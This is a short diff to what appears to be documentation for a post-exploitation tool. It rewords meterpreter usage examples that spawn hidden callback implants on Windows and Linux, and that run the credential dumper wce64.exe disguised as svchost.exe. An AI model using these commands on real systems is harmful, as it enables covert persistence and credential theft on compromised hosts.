@@ -28,15 +28,19 @@ OPTIONS:
 
 ## 5.2 - Usage
 
-* Spawn Callback Shell
+Spawn PE Callback Implant.
 
 ```
-meterpreter > execute -Hicf shell.exe
-
-meterpreter > execute -Hicf ./shell
+meterpreter > execute -Hicf implant.exe
 ```
 
-* Spawn a executable program as a dummy process with `-d` flag.
+Spawn ELF Callback Implant.
+
+```
+meterpreter > execute -Hicf ./implant
+```
+
+Spawn a executable program as a dummy process with `-d` flag.
 
 ```
 meterpreter > execute -Hicmd svchost.exe -f /usr/share/windows-resources/wce/wce64.exe -a "-h"
